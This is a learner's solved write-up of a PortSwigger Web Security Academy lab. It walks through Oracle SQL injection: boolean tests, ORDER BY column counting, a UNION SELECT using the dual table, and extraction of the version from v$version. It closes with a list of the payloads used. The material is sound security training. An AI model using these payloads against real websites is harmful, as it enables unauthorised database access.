# Lab: SQL Injection - Querying Database Type and Version on Oracle

**Platform:** PortSwigger Web Security Academy
**Difficulty:** Practitioner
**Topic:** SQL Injection — Database Enumeration
**Status:** ✅ Solved

---

## Objective
Find and display the Oracle database type and version using SQL
injection on a shopping website's product category filter.

---

## Step 1 — Confirming SQL Injection is Possible

**Test 1 — Breaking the query with a single quote:**
```sql
'
```
Appended `'` to the end of the URL after navigating to the
Techgifts category. The page broke with an internal server error —
confirms the input is being passed directly into a SQL query
without sanitization.

**Test 2 — Logical evaluation test:**
```sql
' AND 1=1--
' AND 1=2--
```
- `AND 1=1--` → page loaded normally with all products displayed
- `AND 1=2--` → page loaded but showed no products

This confirms the application is evaluating our injected SQL logic:
- `1=1` is always true → query returns results
- `1=2` is always false → query returns nothing
- Both confirm SQL injection is possible and controllable

**Why this matters:**
This is called a **boolean-based SQLi confirmation** — the page
behaves differently based on true/false conditions we inject,
proving the backend SQL query is being influenced by our input.

---

## Step 2 — Finding the Number of Columns

Before a UNION attack can work, you must know exactly how many
columns the original query returns — your UNION query must match
that exact number or it will fail.

**Method used — ORDER BY:**
```sql
' ORDER BY 1--    ✅ worked
' ORDER BY 2--    ✅ worked — results displayed in different order
' ORDER BY 3--    ❌ internal server error
```
`ORDER BY` sorts results by a column number. When the column
number exceeds the actual number of columns, the database throws
an error. Error on `ORDER BY 3` confirms exactly **2 columns**.

---

## Step 3 — Testing UNION SELECT

**First attempt — without table name (failed):**
```sql
' UNION SELECT NULL,NULL--
```
Oracle databases require a `FROM` clause in every SELECT statement
— unlike MySQL or PostgreSQL. Without it Oracle throws an error.

**Correct approach — using Oracle's dual table:**
```sql
' UNION SELECT NULL,NULL FROM dual--
```
`dual` is a special built-in dummy table in Oracle that always
exists and always returns exactly one row. Used when you need
a valid `FROM` clause but don't actually need data from a table.

Page loaded successfully — UNION SELECT confirmed working.

---

## Step 4 — Finding Which Columns Display Text

Not all columns may display text output on the webpage — some
might be used for IDs or numbers that aren't shown visually.
Need to find which column(s) render text output.
```sql
' UNION SELECT 'test',NULL FROM dual--    ✅ 'test' appeared mid-page
' UNION SELECT NULL,'test' FROM dual--    ✅ 'test' appeared at end of page
```

Both columns accept and display text — the difference was only
visual positioning on the page:
- Column 1 (`'test',NULL`) → output appeared in the middle of content
- Column 2 (`NULL,'test'`) → output appeared at the end of content

---

## Step 5 — Extracting Database Version

Oracle stores version information in a special view called
`v$version` in a column called `BANNER`.

**Oracle version syntax (from SQLi cheat sheet):**
```sql
SELECT banner FROM v$version
SELECT version FROM v$instance
```

**Failed attempts:**
```sql
' UNION SELECT v$version,NULL FROM dual--     ❌ wrong — v$version is a
                                               table not a column value
' UNION SELECT BANNER FROM v$version--        ❌ missing second column
                                               — column count mismatch
```

**Correct query:**
```sql
' UNION SELECT BANNER,NULL FROM v$version--   ✅ worked but output in middle
' UNION SELECT NULL,BANNER FROM v$version--   ✅ solved the lab — cleaner output
```

Using `NULL,BANNER` placed the version info at the end of the
page in a cleaner format — lab marked as solved.

---

## Key Concepts Learned

**What is UNION SELECT?**
- Combines results of two SELECT queries into one output
- Both queries must return the same number of columns
- Column data types must be compatible
- Used in SQLi to extract data from other tables

**Oracle Specific Rules:**
| Rule | Oracle | MySQL/PostgreSQL |
|---|---|---|
| FROM clause required | ✅ Always | ❌ Optional |
| Dummy table | `FROM dual` | Not needed |
| Version table | `v$version` | `@@version` / `version()` |
| Comment syntax | `--` | `--` or `#` |

**SQLi Confirmation Methods:**
| Method | Payload | What it Tests |
|---|---|---|
| Syntax break | `'` | Is input passed to SQL? |
| Boolean true | `' AND 1=1--` | Does true condition return results? |
| Boolean false | `' AND 1=2--` | Does false condition hide results? |
| Order by | `' ORDER BY N--` | How many columns exist? |

---

## Mistakes Made and Lessons Learned

- **Tried injecting into login page** — vulnerability was in the
  stock/category filter URL, not the login form. Always read the
  lab description carefully to identify the vulnerable endpoint
- **Forgot `FROM` clause** — Oracle requires `FROM table` in every
  SELECT. Always use `FROM dual` when you don't need real table data
- **Used `v$version` as a value** instead of as a table name —
  understand the difference between table names and column values
- **Forgot second column** in `UNION SELECT BANNER FROM v$version` —
  always match the exact column count or you get an error
- **Tried various combinations before structured approach** —
  always follow the methodology in order:
  1. Confirm injection
  2. Find column count
  3. Find text columns
  4. Extract data

---

## Payloads Used (Summary)
```sql
'                                           -- confirm SQLi
' AND 1=1--                                 -- boolean true test
' AND 1=2--                                 -- boolean false test
' ORDER BY 1--                              -- column count test
' ORDER BY 2--                              -- column count test
' ORDER BY 3--                              -- confirmed 2 columns (error)
' UNION SELECT NULL,NULL FROM dual--        -- union test
' UNION SELECT 'test',NULL FROM dual--      -- column 1 text test
' UNION SELECT NULL,'test' FROM dual--      -- column 2 text test
' UNION SELECT NULL,BANNER FROM v$version-- -- extracted version (solution)
```
